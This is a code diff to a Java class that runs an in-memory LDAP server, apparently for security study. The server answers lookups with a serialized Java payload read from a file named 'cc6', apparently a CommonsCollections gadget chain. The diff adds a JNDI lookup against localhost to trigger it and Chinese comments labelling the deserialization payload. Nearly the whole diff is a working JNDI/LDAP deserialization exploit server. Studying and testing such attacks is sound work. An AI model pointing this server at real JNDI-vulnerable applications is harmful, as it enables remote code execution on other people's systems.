@@ -9,6 +9,7 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 
+import javax.naming.InitialContext;
 import javax.net.ServerSocketFactory;
 import javax.net.SocketFactory;
 import javax.net.ssl.SSLSocketFactory;
@@ -31,12 +32,16 @@ public class Deserialize {
         config.addInMemoryOperationInterceptor(new OperationInterceptor());
         InMemoryDirectoryServer inMemoryDirectoryServer = new InMemoryDirectoryServer(config);
         inMemoryDirectoryServer.startListening();
+
+        InitialContext context = new InitialContext();
+        context.lookup("ldap://127.0.0.1:1389/any");
     }
 
     private static class OperationInterceptor extends InMemoryOperationInterceptor {
 
         @Override
         public void processSearchResult(InMemoryInterceptedSearchResult result) {
+            // 反序列化Payload
             byte[] javaSerializedData = new byte[0];
             try {
                 FileInputStream cc6 = new FileInputStream("cc6");
@@ -48,6 +53,7 @@ public class Deserialize {
             
             Entry entry = new Entry(baseDN);
             entry.addAttribute("javaClassName", "Obj");
+            // javaSerializedData属性
             entry.addAttribute("javaSerializedData", javaSerializedData);
 
             try {
